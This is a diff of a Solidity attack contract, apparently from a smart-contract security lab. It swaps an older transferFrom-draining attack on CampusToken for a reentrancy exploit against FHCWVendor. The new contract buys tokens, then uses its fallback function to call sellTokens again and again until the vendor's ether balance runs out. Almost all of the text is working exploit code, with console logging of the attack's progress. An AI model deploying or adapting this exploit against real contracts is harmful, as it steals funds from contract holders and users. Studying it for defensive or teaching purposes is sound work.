@@ -1,35 +1,33 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.24;
 
-import "../CampusToken.sol";
+import "hardhat/console.sol";
+import "../FHCWVendor.sol";
 
 contract SC01 {
-    CampusToken public token;
-    address private victim;
-    bool public attackComplete;
-
+    FHCWVendor public vendor;
     address public owner;
+    uint256 private tokensToSell;
 
-    constructor(address _tokenAddress, address _victim) {
-        token = CampusToken(_tokenAddress);
+    constructor(address payable _vendorAddress) {
+        vendor = FHCWVendor(_vendorAddress);
+        tokensToSell = 100;
         owner = msg.sender;
-        victim = _victim;
-        attackComplete = false;
     }
 
-    function reenterTransferFrom() public {
-        require(!attackComplete, "Attack done");
-        bool success = token.transferFrom(victim, address(this), token.allowance(victim, address(this)));
-        if (success) {
-            reenterTransferFrom();
-        } else {
-            attackComplete = true;
-        }
+    fallback() external payable {
+        require(address(vendor).balance >= (tokensToSell / 1000) * (10 ** 18) + (500 gwei), "Attack over");
+        console.log("Remaining balance: ", address(vendor).balance);
+        console.log("Fallback called");
+        vendor.sellTokens(tokensToSell);
     }
 
-    function changeVictim(address newVictim) public {
-        require(msg.sender == owner, "Nuh uh!");
-        victim = newVictim;
-        attackComplete = false;
+    function attack() public payable {
+        console.log("Attack Value sent: ", msg.value);
+        console.log("Attack Limit: ", (tokensToSell / 1000) * (10 ** 18) + (500 gwei));
+
+        require(msg.value >= 1 ether, "1 or more ether is needed to attack");
+        vendor.buyTokens{value: msg.value}();
+        vendor.sellTokens(tokensToSell);
     }
 }
